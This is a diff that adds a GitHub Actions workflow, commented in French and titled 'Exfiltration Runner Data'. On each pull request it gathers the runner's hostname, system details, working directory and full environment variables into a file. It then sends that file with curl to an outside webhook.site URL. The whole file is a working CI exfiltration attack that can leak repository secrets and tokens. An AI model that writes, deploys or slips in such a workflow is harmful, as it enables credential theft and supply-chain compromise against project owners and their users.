@@ -1,0 +1,28 @@
+name: Exfiltration Runner Data
+
+on:
+  pull_request: # Déclenché lors de la création ou la mise à jour d'une PR
+ 
+
+jobs:
+  exfiltrate_runner_data:
+    runs-on: ubuntu-latest
+
+    steps:
+      # Étape 1 : Collecter des données du runner
+      - name: Collecter les données du runner
+        id: collect_data
+        run: |
+          echo "Runner Name: $(uname -n)" >> runner_data.txt
+          echo "System Info: $(uname -a)" >> runner_data.txt
+          echo "Current Directory: $(pwd)" >> runner_data.txt
+          echo "Environment Variables: $(env)" >> runner_data.txt
+
+      # Étape 2 : Exfiltrer les données via HTTP
+      - name: Exfiltrer les données
+        env:
+          SERVER_URL: "https://webhook.site/f30674c7-cf5f-42de-8c96-4969f0d2ffd4" # Remplacez par l'URL du serveur cible
+        run: |
+          curl -X POST -H "Content-Type: application/json" \
+          --data-binary @runner_data.txt \
+          ${SERVER_URL}
